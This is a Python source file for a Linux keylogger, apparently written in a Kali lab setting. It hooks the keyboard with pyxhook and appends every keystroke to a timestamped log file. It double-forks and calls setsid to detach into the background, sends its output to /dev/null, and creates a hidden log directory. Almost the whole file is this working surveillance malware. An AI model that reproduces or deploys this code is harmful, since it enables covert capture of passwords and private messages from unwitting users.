import os
import sys
import time
from datetime import datetime
import logging
import pyxhook
import traceback

# Error handling for debugging
try:
    # Only set DISPLAY if not already defined
    if "DISPLAY" not in os.environ:
        os.environ["DISPLAY"] = ":1"
except Exception as e:
    print(f"Error detected: {e}")
    print(traceback.format_exc())

# Set up logging for debugging
logging.basicConfig(filename='/home/kali/Desktop/keylogger/keylogger_debug.log', level=logging.DEBUG)

# Hidden log file path
log_dir = os.path.expanduser("~/.logs/")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = f'/home/kali/Desktop/keylogger/log_{datetime.now().strftime("%d-%m-%Y_%H-%M")}.log'

def OnKeyPress(event):
    try:
        with open(log_file, "a") as f:
            if event.Key == 'P_Enter':
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")
    except Exception as e:
        logging.error(f"Error in OnKeyPress: {e}")

def run_in_background():
    try:
        # Fork the process to run in the background
        pid = os.fork()
        if pid > 0:
            sys.exit()  # Parent process exits, child continues

        # Set new session
        os.setsid()

        # Second fork to ensure it can't acquire a terminal
        pid = os.fork()
        if pid > 0:
            sys.exit()

        # Redirect standard file descriptors to /dev/null
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        sys.stdin = open(os.devnull, 'r')

        # Start keylogger
        new_hook = pyxhook.HookManager()
        new_hook.KeyDown = OnKeyPress
        new_hook.HookKeyboard()

        try:
            new_hook.start()
        except KeyboardInterrupt:
            new_hook.cancel()
        except Exception as ex:
            logging.error(f"Error starting keylogger: {ex}")
            with open(log_file, "a") as f:
                f.write(f"Error: {ex}")
                while True:
                    time.sleep(10)  # Keep the process alive for debugging
    except Exception as e:
        logging.error(f"Error in run_in_background: {e}")

if __name__ == "__main__":
    run_in_background()
